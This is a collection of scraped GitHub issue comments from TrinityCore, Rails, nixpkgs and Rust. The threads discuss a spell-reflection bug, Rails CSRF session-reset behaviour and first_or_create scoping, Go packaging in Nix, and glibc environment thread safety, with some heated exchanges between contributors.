TrinityCore/TrinityCore/7994/12476548,"Working partially on a261231d3f345eb4cf4e4601cd1dba1506d6f989 Now only pets bug the partner interface (owner interface works fine), and the rest it's fine ",,False,False,7994
TrinityCore/TrinityCore/7994/17422589,"confirm, frame is bugged in rev ",,False,False,7994
TrinityCore/TrinityCore/7994/20652100,"Reopen this, confirm at 5a6eacfa3361c87c776915204caef9be2851486e ",,False,False,7994
rails/rails/1917/1144319,"It seems that at some point in time the code of the request forgery protection was modified in such a way, that the InvalidAuthenticityToken exception is not thrown anymore. This change was made in a very sloppy way, take a look at  exception class is still there, but the exception is not being thrown anymore, instead the handle_unverified_request method is being called, which by default just quietly resets the session (!?). This is a pain to debug if you happen to have a problem with token somewhere in the application, you just get logged out of the sudden without any apparent reason. What's worse is that the handle_unverified_request method is not at all documented and in fact the documentation still talks about throwing an exception ",,False,False,1917
rails/rails/1917/1475280,"From 3.1, Rails shows a warning in the logs when the session is reset. You are right about the api doc being outdated. You can change it in  if you wish. Or I'm sure someone will take it up and fix ) ",,False,False,1917
rails/rails/1917/1475281,"This is because of a security issue - read this for more information. Yes, the method could be documented better - you can contribute some via the docrails project if you'd like to. The docrails repository is a public access repo where anyone can submit documentation patches. ",,False,False,1917
rails/rails/1917/1475302,Why are you closing this issue? This is a serious problem and it was not fixed. Since when is it OK for Rails to have docs that are misleading and completely out of date? ,,False,False,1917
rails/rails/1917/1475825,Few more links  think that this request should be reopened if the doc is misleading. ,,False,False,1917
rails/rails/1917/1476959,I've made the change in docrails ,,False,False,1917
rails/rails/1917/1477295,"vijaydev Thanks! I think this change was made in a rather mindless way and it should also be fixed in the code. The InvalidAuthenticityToken class is still present in request_forgery_protection.rb, which makes controllers using old invalid token handling code like this work without a glitch, even through the exception is not thrown any more and this code simply stops working when upgrading to a Rails version which introduced this change (A minor revision breaks compatibility and it's not even mentioned neither in the release notes nor in the documentation!). Either the handle_unverified_request method should be removed and the exception should be thrown again (after resetting the session?), or the exception class should be removed from the code and from the tests. In fact the commit that introduced this patched the test controllers to throw the exception as it was in the past, but it seems not enough thought was given to everybody else applications and tests  the cause of my application randomly logging people out costed me a few days of work and it seems to me a part of a larger issue of a very careless attitude towards maintaining compatibility and not breaking existing functionality with the introduction of the newest kool-aid. Until recently I seldom had to dig into Rails code to find a problem occurring with my application, but when migrating to Rails 3.0 I find problem after problem of this kind, previously I have spent a week trying to spot a performance regression, which turned out to be caused by changes in PostgreSQLAdapter and made the application in concern work three to four times slower. Perhaps changes should be made and accepted with greater care... ",,False,False,1917
rails/rails/1917/1477448,"@friend thanks for that - any chance you can document the handle_unverified_request method? @friend I closed it because I knew that someone like @friend would fix it and if I left it open then before too long we'll be back to where we were with the LH tracker and we'd have HN articles screaming ""OMG! Rails has a thousand bugs"". As for the hyperbole in your reply - no it's not a serious problem, it's not the first time that docs have been incorrect (it won't be the last either) and I think ‘completely’ out of date is a little bit of exaggeration don't you think. I'm sorry you lost some time due to this but this kind of thing happens to all of us. ",,False,False,1917
rails/rails/1917/1477550,"You knew that someone would fix it and that's why you have closed it? I thought it works a bit differently, first someone fixes it, then you close the issue ^^ I think it is a serious problem if people are loosing days of work because of it, and if you look at the links posted above by paneq I'm not the only one affected by this. I also pointed out a specific, technical defect with the changes that were made which you have chosen to completely ignore. ",,False,False,1917
rails/rails/1917/1477569,"@friend I understand the frustration. I myself had suffered silent session resets and spent time on debugging. But let's not get carried away. Calling people's hard work mindless is not going to help anyone. And if I remember right, 3.0.4 was released primarily as a security fix release and this change was well advertised (on Google groups, rails blog etc). As for the code changes you mention, @friend or @friend might have a better understanding and they can take this discussion forward. ",,False,False,1917
rails/rails/1917/1477596,@friend Sure. Will doc that. ,,False,False,1917
rails/rails/1917/1477622,@friend the reason the exception is still there is so that you can override handle_unverified_request and raise it yourself. The reason that the code defaults to resetting the session is that the main class of requests affected by the change were API requests which generally weren't using sessions so it was better than starting to generate errors. Since it was a security flaw there was no choice other than to break backwards compatibility. ,,False,False,1917
rails/rails/1917/1477733,"@friend I don't really understand the logic here. I think the session is being reset because of the security issue itself (see  and that's fine. But there always was a way to customize the handling of the situation in which the token was invalid, and the way to do it was to use rescue_from as I have shown above and I'm pretty sure a lot of applications already do it this way. So, if you don't want a server error you can customize the method handling the exception and you're all fine. If the exception would be thrown after the session was reset it would be still OK security-wise, it would not break compatibility in this aspect and people would more easily understand why the sudden logging-out occurs. If you absolutely want to introduce a method for handling an invalid token, that's fine, but it should not be done in a bugfix release, should be documented in release notes and in this situation what exactly would be the point of raising this exception from your handle_unverified_request? Sincerly, it looks to me like this was done just to avoid heavier modifications in the Rails test suite. If the exception would be removed, then at least this rescue_from code that is just dead now, would at least cause a runtime error. ",,False,False,1917
rails/rails/1917/1477876,@friend Have a look at the release notes  It just says it's a security fix and there isn't a word about an upgrade procedure. The only place this was documented is a blog post ,,False,False,1917
rails/rails/1917/1477989,"To nitpick, what you call ""release notes"" is also a blog post. The links @friend provided also talks a lot more about this. ",,False,False,1917
rails/rails/1917/1478125,"As mentioned by others this change was deliberate.  We cannot raise exceptions in the unverified request scenario any more because we cannot whitelist API and Ajax requests like we did previously.  Because of this the default handler resets the session which prevents the bulk of the relevant attack vectors. However you do still need to be careful and we're clearly lacking documentation on the things you need to be careful with. @friend While I appreciate your frustration you seem to have missed that the entire reason that the releases were done was to address a serious, exploitable security flaw with the previous method.  We had to change it, and change it in a way that's backwards compatible.  Making the exception be raised by default would reject every single api request, which is clearly unacceptable. Unfortunately you couldn't even work around this using rescue_from because an API without a csrf_token is valid you don't want to abort processing, but for security reasons you still needed to fire the unverified request handler. ",,False,False,1917
rails/rails/1917/1478192,"@friend Ok, now I finally understand the rationale for this, perhaps parts of what you just said should also be part of documentation, so that it's harder for other people to miss the point as well. ",,False,False,1917
rails/rails/1917/1478289,"@friend If you wanted to have a go at documenting it, I'd appreciate it.  One of the problems is that as part of addressing the finer points of the flash vulnerability I no longer have any idea what is and isn't confusing to users who didn't spend a month brainstorming the problems and solutions ",,False,False,1917
rails/rails/1917/1480525,"@friend One thing I still don't understand is why the InvalidAuthenticityToken exception class was and still is kept in the code. If it were removed then people migrating to newer Rails versions would get an error from their rescue_from clause, like it is right now that clause just silently stops working. ",,False,False,1917
rails/rails/1917/1488067,"The exception is still there because if you don't have an API client you can override the handler method and make it raise that same exception.  This was covered in the release notes. On Fri, Jul 1, 2011 at 322 PM, sztywny reply@friend.github.com wrote --  Cheers Koz ",,False,False,1917
rails/rails/1917/1488397,"@friend And this is the part that I still think should be changed. Seldom do libraries (frameworks) provide exception classes that the API user ""might be willing to throw"". If Rails itself doesn't raise the exception, it should not be part of Rails. From what I understand there is anyhow no point in raising InvalidAuthenticityToken from handle_unverified_request, then adding a rescue_from and finally doing the actual handling of the invalid token situation in some additional method, because you can do all the handling directly in handle_unverified_request, returning false in case one wants to stop the processing (this should maybe be documented). The same with rendering a 422 or a 500 http code. And removing this exception class prevents old code from failing silently after a migration to a newer version of Rails, which I guess will keep hitting migrating people if it won't be fixed. ",,False,False,1917
rails/rails/1917/1488531,"@friend there are perfectly valid reasons for throwing the InvalidAuthenticityToken. For example you may be using the [Hoptoad] notification service and want to capture these errors. Now you could call the Hoptoad notifier yourself in  but why not just raise the error and let the built-in handler deal with it. And as @friend points out, if you're upgrading and you have a bunch of code elsewhere handling this then just raising this error is quicker and simpler as an upgrade than having to rewrite and move the code into . ",,False,False,1917
nixpkgs/NixOS/1131/21661383,"Currently packaging Go software is ugly, see ",,False,False,1131
nixpkgs/NixOS/1131/39524841,Anyone working on this? ,,False,False,1131
nixpkgs/NixOS/1131/42922950,"I can take a stab at this. Here's what I had in mind in terms of usage go-update = buildGoPackage (fetchgit {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; });  That is, it would merely wrap another derivation. How does that sound? I had an alternative idea that's a little more elaborate go-update = buildGoPackage {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; };  I could infer the repository type just as  does. I could see value in both approaches - if only I could come up with decent names... ",,False,False,1131
nixpkgs/NixOS/1131/42932724,"The first one () means that  can never be extended with other function arguments. Do Go packages always come from GitHub? Otherwise it's better to stick to the regular BTW, note that we now have a  function, which is preferable over  because it doesn't pull in Git as a dependency and is probably faster. ",,False,False,1131
nixpkgs/NixOS/1131/43026622,"Good point. The Go compiler has hard-coded support for Bitbucket, GitHub, Google Code and Launchpad, with the expected url formats documented under ""Remote import paths"". As a side rant, the Go community's lack of discipline around versioning is rather annoying (with the Go compiler reinforcing the ""just pull from master"" attitude, as it doesn't allow for specifying revisions/tags). I have a plan for a ""go2nix"" tool that, given a release date, will traverse the import graph looking for revisions of each dependency as close to the release date as possible, ultimately generating a nix expression. I feel almost dirty suggesting such a thing, but it seems like the most practical approach to Go package automation, given the lack versioned releases... Yes, I was very happy to see that commit the other day - very nice ). I'll hack on this a bit and see what you think. ",,False,False,1131
nixpkgs/NixOS/1131/56573985,I wrote a tool to address this go2nix I'll try to get it into nixpkgs soon. ,,False,False,1131
nixpkgs/NixOS/1131/56574830,"Btw all those symlinks are not needed in the ngrok example. GOPATH can be used instead, but I guess you know already. ",,False,False,1131
nixpkgs/NixOS/1131/57696579,"@friend ngrok's Makefile expects that it can spit out some source code in it's source tree, so it's actually easier to just dump all the go package sources into the same store path, rather than just having a GOPATH entry for each and needing to special case the ngrok directory. I figure there will be plenty of other projects that behave similarly, so I think it's easier to just pile everything into the same folder. ",,False,False,1131
nixpkgs/NixOS/1131/135121306,This is done. ,,False,False,1131
TrinityCore/TrinityCore/19440/220818627,"Description Spell Reflect is reflecting multiple ""ticks"" of channel spells like Arcane Missiles spell 42846 = [Arcane Missiles] spell 23920 = [Spell Reflection] Expected behaviour Spell Reflect should reflect the first ""tick"" only Steps to reproduce the problem  Put a mage and warrior in duel With talent  [Missile Barrage] (spellid=44401) active, use Arcane Missiles in a warrior with Spell Reflect active You should receive back 2 Missiles, instead 1  Is more easy reproduce if mage has a good hast rating Branch(es) 3.3.5 TC rev. hash/commit  21b2042840e05ebeba365c54d47c07c13fde123f ",,False,False,19440
TrinityCore/TrinityCore/19440/293132139,"i dont think so, before your spells rework, all missiles hit warrior and 0 was reflected xd ",,False,False,19440
TrinityCore/TrinityCore/19440/293132706,Is improved spell reflection speced during this? ,,False,False,19440
TrinityCore/TrinityCore/19440/293133822,Imp. spell reflection only affects party members ,,False,False,19440
TrinityCore/TrinityCore/19440/293142514," three first waves of arcane missiles will get reflected, and the next ones you will have to take. the drain life cast will just simply cancel, and he will have to use another global cooldown to cast it again. the drain soul cast will simply cancel, and he will have to use another global cooldown to cast it again. the mind flay cast will simply cancel, and he will have to use another global cooldown to cast it again.  ",,False,False,19440
TrinityCore/TrinityCore/19440/293481045,Bad issue tagged in commit ,,False,False,19440
TrinityCore/TrinityCore/19440/303227170,"@friend you said Expected behaviour Spell Reflection should reflect the first ""tick"" only Don't be stupid, @friend Spell Reflection should reflect all of the missiles. Have you even even researched this? ",,False,False,19440
TrinityCore/TrinityCore/19440/303295707,"No need to insult other users, if you think something is wrong just state it. ",,False,False,19440
TrinityCore/TrinityCore/19440/303316482,"Maybe if he researched it, I wouldn't have insulted him. ",,False,False,19440
TrinityCore/TrinityCore/19440/303321020,"Ok, bad attitude even warned, next time you will be blocked. ",,False,False,19440
TrinityCore/TrinityCore/19440/303371777," Btw, i will try some friend to check it on retail, i'm pretty sure it only should reflect the first ""tick"" I remember when i'm doing arena close to pre patch (wotlk-&gt;cata) and in middle of MOP my penance reflect only first tick. With more time i will search more videos too ) ",,False,False,19440
TrinityCore/TrinityCore/19440/306172701,yeah i cant find videos to to sustain my point... So updated issue description. Thanks lineagedr. ,,False,False,19440
rust/rust-lang/27970/102666718,"Like the documentation for our  (setenv) says, care must be taken with mutating environment variables in a multithreaded program. See this glibc bug #13271 that says getaddrinfo may call getenv. It looks like we have an unsynchronized call to getaddrinfo and this may cause trouble with glibc/Linux. Seeing glibc's attitude to setenv in multithreaded programs,  seems like a big hazard in general(?). Discovered as an issue tangential to #27966 cc @friend ",,False,False,27970
rust/rust-lang/27970/134264717,If we did take this route I'd want to convert the environment lock to a rwlock to ensure that we could at least have parallel dns queries. Also cc #27705. ,,False,False,27970
rust/rust-lang/27970/134268078,"Yeah, either way the situation is tricky. We get tangled up in glibc internals. ",,False,False,27970
rust/rust-lang/27970/134273584,I found the wording on this page also particularly interesting The getaddrinfo function is indeed marked with this tag ,,False,False,27970
rust/rust-lang/27970/264624978,"is just broken, as I commented on issue #24741 Even without low-level races,  is not quite safe because you can change a variable (such as ), do something, and change it back to the original value, without impacting something else in the process which runs at the same time. This problem would not go away if we provided thread-safe environment access at the libc layer. Therefore, I'm surprised the function isn't marked **. ",,False,False,27970
rails/rails/9894/12368417,"Running rails 4.0.0-beta1 on ruby 2.0.0-p1. It seems as though when you perform code like the below, the where clauses are inherited by any callbacks it runs. The above exhibits the problem. All of the below function as intended. By debugging on the rails console it reveals This also applies to the first_or_create methods. I'm yet to test the find_or_create methods or the rails 3.x series. Should I write this into an active_record test? Any advice as to where to start? I've created an example application with this problem here  Example class used below. ",,False,False,9894
rails/rails/9894/15460003,Hey @friend and thanks for your report. I'm not sure if this is actually a bug. This problem was reported before and you can follow the discussion here #7853 and here #7391. Those tickets were closed because it was the expected behavior. /cc @friend ,,False,False,9894
rails/rails/9894/15460674,Right if its working as intended thats fine. In Rails 3 I would have used find_or_create_by_full_name(full_name). I'm just playing with rails 4 a bit and most of the transition documentation said to change that to the where(hash).first_or_create_by. I didn't realise the existence of .find_or_create(hash) until looking into the ActiveRecord code to investigate. Did you want me to document how those methods work anywhere or how things should be changed for compatibilty? Unsure exactly how railsguides and the like work and what happens during changeover between major releases. ,,False,False,9894
rails/rails/9894/15461025,"If we settle that this is the expected behavior It totally makes sense to document it. The fact that already 3 reports were filed regarding the same problem shows that it's not as ""expected"" as it could be which makes documentation even more necessary. In my opinion the guides should explain how to get a 3.x app running on 4.0 without such complications. I think it would be good to promote . As the described scenario is a combination of different methods on relation it's kind of hard to put it into the rdocs. Methods that always run into this behavior like  could be a good place though. @friend @friend thoughts? ",,False,False,9894
rails/rails/9894/15462752,"Is  available in 3.2? I've been migrating across to the  recently in my 3.2 apps because it was available and was the way rails seemed to be moving forward. Just figured I'd add my 2c regarding how it looks. I did think the  syntax was really nice before this, especially being able to pass in a block for extra parameters. It looked a lot nicer than the original  methods since you construct it like any other relation and then tack on  to the end. It was the guides like that below and some others which suggested this as a drop in replacement.  idea of just doing  as a work around seems awkward and I would've expected to be equivalent to . I guess it ends up being a question of how often is this desired functionality, how often will it trip people up and how complex is it to ""fix"" right? ",,False,False,9894
rails/rails/9894/15484398,"Yeah, I think we should promote  since its behavior is closer to the dynamic finders. ",,False,False,9894
rails/rails/9894/15657859,"Jon implemented find_or_create_by on relation, so let's just document that. ",,False,False,9894
rails/rails/9894/15952776,"I agree. I kinda consider  and friends to be soft-deprecated, so we should definitely promote  and friends in the docs. ",,False,False,9894
rails/rails/9894/15953660,Want me to write something up to that effect in the Rails 4 release notes + upgrading ruby on rails guides? ,,False,False,9894
rails/rails/9894/16114796,"@friend if you want, please ",,False,False,9894
rails/rails/9894/16501297,I'm confused. Rails 4 Release Notes says this ( can be rewritten using find_or_create_by(...) or where(...).first_or_create.  Is this incorrect now? Considering that  is soft-deprecated? ,,False,False,9894
rails/rails/9894/16501442,"Let's say I had this Model.where(a 1, b 1).first_or_create(c 1)  How can I reproduce this behaviour with new methods? It's sad,  was really useful. ",,False,False,9894
rails/rails/9894/16502865,"I've updated docrails to try and reflect that the firstor* methods shouldn't be used as drop in replacements for the others. I don't know if there are similar issues with first_or_initialize, but I'm guessing there could be if you did specific things in an after_initialize block.  the changes to magical finders a big enough change to be mentioned in the upgrading_ruby_on_rails guide? Currently there is no mention of them. I can't comment on the soft deprecation status, but can comment on that code. As it stands it would work, but would be very dependent on any callbacks in your model as the scope of the where will effect them as well. If you didn't want to use them to prevent potential issues later you could rewrite it in one of the following ways I liked it the firstor* methods, but if they're too complicated or difficult to maintain I'm not overly attached to them. ",,False,False,9894
rails/rails/9894/16502986,"@friend Thank you, that was very helpful! thumbsup ",,False,False,9894
rails/rails/9894/23222478,Is this still a bug now after changes to  ? ,,False,False,9894
rails/rails/9894/23223901,@friend I agree that we should mention it in the upgrading guide. Then I think that we can close it. ,,False,False,9894
rails/rails/9894/23225095,Since @friend said the firstor methods are soft deprecated should we only mention the drop in replacements of findor_by() ? ,,False,False,9894
rails/rails/9894/23225183,I've done that already in  should I just merge that onto master of docrails? ,,False,False,9894
rails/rails/9894/23282489,@friend I have added  based on your changes. You can merge your changes after that gets reviewed. ,,False,False,9894
rails/rails/9894/25235215,"I don't understand how this issue has been closed. The first report didn't include any  methods as does not my issue #12305. How come they're related or is the documentation still not sufficiently written? Documentation only writes about those dynamic methods, but not telling anything that this code should not work as it did before♠Foo.where(name ""bar"").createFoo.where(name ""bar"").first_or_create(baz ""bar"")`. Are you trying to say with the documentation change which led of closing these issues, that the code above should also not work and it is expected behavior of changing the default scope of the class itself (not even singleton class)? ",,False,False,9894
rails/rails/9894/25235694,For reference I'm posting the example from #12305  I'll reopen as we did not change documentation for  in combination with scopes. ,,False,False,9894
rails/rails/9894/25236325,"As mentioned above, i don't think that the problem is only not being mentioned in the documentation, but the problem is that the class's scope itself is changed, which should not ever happen (unless specified explicitly with default scope, if i'm not mistaken). ",,False,False,9894
rails/rails/9894/25236787,"I dug around myself before creating this ticket. I was using first or create and found that it was calling first and then ORing the result with create. Thus the problem (as I saw it) was within the create method, so thats how I raised the issue. The reason this was an issue for me (and others) was because first_or_create was the recommended upgrade path from find_or_createby methods in rails 3. This had different behaviour to the original find_or_createby methods so instead I changed documentation to point at the newer find_or_create_by(hash) methods which had the same expected behaviour. I've got no idea if / when the behaviour of MyModel.query_scope.create was changed. Did it behave differently in previous versions of rails or is the comment more that it is unintuitive? ",,False,False,9894
rails/rails/9894/25237000,The example code i wrote in issue #12305 worked fine with ActiveRecord 3.x series. The problem arised when i upgraded to 4.0. ,,False,False,9894
rails/rails/9894/35853571,"It seems like the problem is that the lifecycle hooks/callbacks are being evaluated within a scope. What if we were to make all off these hooks be performed without scoped? That is, when would we need/want them to be performed inside a scope? ",,False,False,9894
rails/rails/9894/44300178,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False,False,9894
rails/rails/9894/44303753,The problem still exists in  - i can reproduce the problem with example described in #12305. ,,False,False,9894
rails/rails/9894/44304398,Thanks. We do have a fix for at  I'll link this issue there. ,,False,False,9894
rails/rails/9894/68540659,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False,False,9894
rails/rails/9894/68591439,The problem still exists in  - i can reproduce the problem with example described in #12305. ,,False,False,9894
rails/rails/9894/125373181,@friend Do you realize the bug has been open for 2 years and it's still not fixed? WOW... ,,False,False,9894
rails/rails/9894/125401218,"@friend its OSS, feel free to open a PR with a fix. Comments like that really aren't helpful. @friend @friend since this has been behaviour for all of the 4.x series is it worth reconsidering what intended behaviour should be given 5 is on the horizon? Possibly more people relying on this behaviour now than not. I'm not sure. ",,False,False,9894
rails/rails/9894/125401451,@friend Sorry don't want my name associated with rails/AR ;) ,,False,False,9894
rails/rails/9894/125506531,Too late. Your entitlement to the free labor of others is now a permanent marker in the annals of Rails. ,,False,False,9894
rails/rails/9894/125680963,"@friend lmao When did I say I was using rails? Was just trying to help a friend, I dropped rails/AR years ago mostly because of that kind of issues ;) ",,False,False,9894
rails/rails/9894/125699659,"Your friend is most welcome to join the community and help device a solution to their issue, if they can do so without your obnoxious entitlement. Please do be on your merry way to whatever community you've found that has either no issues or is willing to tolerate your attitude about them. ",,False,False,9894
rails/rails/9894/125702073,"@friend You're over reacting my friend, I'm just pointing out true facts. And that's it. There ain't no bad intention. We all have issues but there's way different ways to tackle them. I was reading an interesting article about why is rails community slowly dying (small comparison with node -- which I'm not fan of personally)  and I do believe that is that kind of attitude that leads to it. I'm sorry if you can't distinguish your allies from your enemies. ",,False,False,9894
rails/rails/9894/125708411,"Your ""true facts"" are as laughable as your claim of ""ally"". Rails is at this point a massive system with an incredibly strong, diligent, and ever-expanding community of users and contributors working on improving it. But there will always be bugs, and this particular bug just wasn't important enough to summon any effort to its fix. Ipso facto. Rails is not a vendor that owes you, or your friend, anything. It's a common space where everyone can contribute their own fixes and improvements, and in return enjoy that in kind from others. You contributed nothing but needless scorn and entitlement. That is not the behavior of an ""ally"". Your post-rationalization for this disgraceful behavior is that the truth of a fact like ""bug X has not been fixed for me in duration Y"" completely side-steps the point. That truth is both trivial and obvious. You're not providing any service of revelation by sharing. The tone in which you chose to, though, was indeed in bad intention. Your clearly meant to, and obviously continue to, belittle the work of thousands of contributors who share their work with all for free. And for what? Do you think anyone will be inspired to help your friend deal with this issue with greater haste because you huffed and puffed? Quite the contrary. Demanding the free labor of others with indignation is no way to inspire their charity. So, again, please pack your entitlement, your banal analysis of the health of Rails, and be gone. Shoo, shoo. ",,False,False,9894
rails/rails/9894/125712333,"Since we are discussing tends, these are interesting number about what you are complaining here  I think these numbers speak by their self. Yes, I'm aware that this issue is open for 2 years. In fact I'm aware of all the issues on the issue tracker. But my time is limited, my interest too and I try to focus my time on the things that most interest me, because after all I work here not because someone pays me, but because I love to work with this team and use my free time to help people. I'm also aware that this is not a trivial issue to fix and it will require a lot of work and it may break a lot of applications like @friend correctly pointed. I know It will be fixed eventually, because there are so many great people working on this framework that it is just matter of time. Every single day someone new starts to contribute to this framework and it is amazing how a little bit of encouragement can create amazing regular contributors like @friend @friend @friend @friend @friend @friend @friend just to name few. I really don't know if Rails is dying, but I don't care, because the machinery that runs this framework is more alive than ever. ",,False,False,9894
rails/rails/9894/125713833,"@friend indeed, this is something that we can just change on Rails 5. The issue is assigned to me, we already have some patches, @friend already touched this code too, so I believe we will get it fixed in time to Rails 5. ",,False,False,9894
rails/rails/9894/125722544,"@friend Actually I don't think you're right. Because now I got your full attention, then people will come watch to see what's happening, and that issue will be work on again. Awareness is the key. ♠Do you realize the bug has been open for 2 years and it's still not fixed?` IS a true fact, and if you want to laugh about it, feel free but then I really wonder what kind of leader you are for ""Your community"". As you see it was not address against anyone, it was just an open statement. I have not asked for anything, nor I said that you owe me anything. Do you think you're going to win that argument by insulting and trolling me? In my humble opinion you should focus on more important thing for ""Your community"" than attacking the ones that want to raise awareness. For my friends we found a way around it, so now it would just be helping ""Your community""... Again, I think your attitude is very disappointing far far away from constructive. You should learn that contributing to a project is not the only way to make it move forward (note that I do not claim I ever did), and you should be grateful to all the people that are still trying to make Rails a better word rather than trolling them for your own sake. ",,False,False,9894
rails/rails/9894/125724321,"In my experience that is not what happens. In fact this issue is an outlier, for the reasons that I already explained. So even with awareness the fix is still not trivial and I doubt it will be fixed. ",,False,False,9894
rails/rails/9894/125729656,@friend I love statistics. Check this out ,,False,False,9894
rails/rails/9894/125773865,"You left out the  part of your quote, dude, which was kind of the finer end of your shitty point ",,False,False,9894
rails/rails/9894/125776348,"@friend stay polite please ;). And Yes WOW to express how surprise I was, did not bring much in the conversation, re-mentioning it felt useless to me (don't feed the trolls). Instead of trolling feel free to leave constructive comment and show that you're a grown man. To come back to what Rafael said, in my humble opinion having bug is one things, not documenting and letting them hide into the code is another one. ",,False,False,9894
rails/rails/9894/125777001,"If we document a bug it is not a bug anymore but a feature smile. Like I said this bug will die, when we think it is time. ",,False,False,9894
rails/rails/9894/125778016,😂😂 That's an extreme way of seeing things but why not... ,,False,False,9894
rails/rails/9894/125784812,Please leave these wonderful people alone. Myself and many others appreciate their work. ,,False,False,9894
rails/rails/9894/125791951,"Seriously, this guy has become a troll himself. The issue will be fixed when it's fixed. The Rails core team along with the entire community is constantly working on both features and bugs which amazes me.  Personally, I'm grateful for all of their hard work and sacrifice for the betterment of the framework. If people want to bitch and whine about a long standing ""bug"" then perhaps they should quit the rant, write some code, and create a PR.  Last time I checked the core team and contributors are not on some corporate payroll and are not obligated to do anything. They do it for the love of the framework and the community which I think is fabulous. Hopefully this thread dies, it's getting way out of hand. Myself and thousands others appreciate all you guys do! ",,False,False,9894
rails/rails/9894/125800377,"Certainly, this is just one of many issues with AR (the other one which comes to mind being rails/rails#9813 which can be ""solved"" by upgrading, which is not always a practical solution) I don't even recall the reason why I subscribed to this, but over time I learnt to be more defensive against the very framework itself (especially functionality that is obscure or only used by a minority). ",,False,False,9894
rails/rails/9894/125801828,"@friend good to hear. Doesn't worry me too much since I just found it when playing with pre release stuff. @friend if ever I'm like ""I wonder what happens when I..."" and I think the behaviour is a bit edge case-y I'll just write a test around the ""broader"" task I'm trying to accomplish. Caught a few bugs in similar cases where I've been relying upon edge cases which have changed during an upgrade. ",,False,False,9894
rails/rails/9894/178286933,@friend based on your comment in  should this issue also be closed since its currently targeting 5.0? ,,False,False,9894
nixpkgs/NixOS/4952/48453048,"I'm leaving this here in hopes that it'll be useful to someone. I didn't see anything in the NixOS manual that would indicate that I'd run into this class of problems while using it (granted, I've not read it in detail, but it's largely unreadable and overall, the whole codebase is poorly documented - attempting to discern the intent of the programmers isn't worth my time anymore, eg, where is the BNF form for the Nix language? What was so wrong with existing languages that a new one had to be invented. Where are the design documents? Perhaps I'm just not looking hard enough... in any case, looking hasn't proved useful, and reading the sources has revealed only a complete and utter disregard for quality.). Cheers. ",,False,False,4952
nixpkgs/NixOS/4952/62652460,"I tried building SBCL-1.2.5, cutting out the SB-POSIX tests until I can figure out something better. I'm betting that this is NixOS related. there were issues trying to run an XULrunner binary too for whatever it's worth. ",,False,False,4952
nixpkgs/NixOS/4952/62653355,"Some notes 1) For the overall design of the language and concepts, Eelco's papers are (for better or worse) the best place to look, I think. They describe the language, its motivations, and NixOS rather thoroughly. Some good starting points are Nix A Safe and Policy Free System for Software Development, and NixOS A Purely functional Linux distribution. It's been known for a while that unfortunately documentation is lacking on a few of these fronts. It's absolutely something we need to fix (I too think the NixOS on-boarding and beginner material is fairly sub-par). 2) Related to the above, there is no true BNF describing the Nix parser, unfortunately. This was a question raised recently in an attempt to write another Nix implementation in Haskell. A proper BNF is something that should be easy to add to the documentation somewhere. 3) I am confused by your inquiry about libraries being available. , , etc are all readily available in Nixpkgs (if they weren't, many other things would not be either). Your query of  does not tell you anything useful or meaningful. You must query the actual repository, which is described using Nix. For example $ nix-env -qa | egrep -i '(libx11|libxau)' libX11-1.6.2 libXau-1.0.8  In your paste of the Emacs  file, one dependency is specified as . This is not the same as  - indeed,  is actually a meta-package which encompasses the modular Xorg framework and many libraries, including , , , etc etc. You may determine this by looking at what the name  is bound to in  and seeing what other packages it incorporates. That said, I'm afraid I cannot help you with SBCL or StumpWM. I use neither. As it stands today, the NixOS community is structured such that all Nix users are, in essence, de-facto Nix developers. This community is still so small it is almost a requirement for you to use it regularly. In return, most of us believe the benefits are massive enough to deal with that. But it is not true of everyone. That is an understandably painful reality, but it's a reality we cannot yet change. Hopefully in the future we can have enough users and dedicated maintainers to alleviate this burden from the userbase, and StumpWM and SBCL and X number of other things will just work for anyone who wants them, with no effort. If a package is broken or outdated or unmaintained (which happens with any distro), it almost always falls to a user who wishes to use that software to maintain it, I'm afraid. Have you tried asking on the  channel on freenode? I've found many helpful people there in my time who may be willing to assist you in getting a more recent SBCL and StumpWM working.  Oh, and one final thing about your 'editors note' (which I'll quote to ensure everyone can read it for the future) # Fix the tests [editor's note 'fix' the tests by removing them? fuck you.]  If you wish to behave this way, I'm afraid my impression is that your mind about how to conduct yourself in public spaces is fairly made up - and no amount of honest actors will change that behavior or attitude. I can understand frustration at using new software and being perplexed by it. But your tone in here is pretty clear. And I imagine those aren't attitudes we want anyway - besides, nothing brought you here beyond your own desires. So, if that is the case, you should find a community that does appreciate that sort of attitude - perhaps the Common Lisp community does. Or the Xbox Live community, perhaps. ",,False,False,4952
nixpkgs/NixOS/4952/62661772,"For worse. I would use the term ""tedious bullshit"" to describe this task, but whatever, moving on. I'm an idiot, thank you. I'll look into this now. WIP, K. curl  | grep gabriel_laddel (dolist (k '(""define remove"" ""define fix"" ""define test"") (google k))) There is nothing perplexing about Nix. A person with the handle thoughtpolice doesn't want anyone to use mean words or to be critical of a project he is involved with? Color me shocked. ... sizzle Thanks for the help. ",,False,False,4952
nixpkgs/NixOS/4952/62670288,"No, actually. It's because I'm a developer who works on other open source projects (several for my job), and realistically I have better things to do than deal with annoying people telling me and other people in the projects I work on to go fuck themselves - which substantially decreases my motivation to deal with said project in the first place. Indeed, my respect lies with the NixOS developers, and not you. So you'll have to forgive me if I find you annoying, but that's life sometimes. This should be pretty plainly obvious (as opposed to your quite rude assumption of my motivations and presumably willful misinterpretation of it, as if it would help your position). But apparently it needs to be spelled out to some people who seemingly incapable of understanding these aspects of social interaction and why their behaviors might be considered harmful. Which I believe are pretty clearly alluded to in my original posting. Of course, I'm not about to succumb to such belittling tactics by people like you - that would only prove such tactics work to drive people away, ultimately harming everyone. So I'm afraid the feared Orwellian Thought Police of NixOS™ is here to stay -- much to your great despair, I imagine. Be afraid - be very afraid!  That said, this bug is a bit convoluted. Really there are several things going on here, based on your original description 1) The emacs package is missing several things, including - Infopages are not built by default. - PDF/postscript viewing doesn't work.  2) Dependencies for Emacs are unclear, although as I explained before, we should have all of these readily available. They merely follow different conventions for naming/meta-packaging. If something is missing, it can certainly be upstreamed. 3) SBCL tests should not be 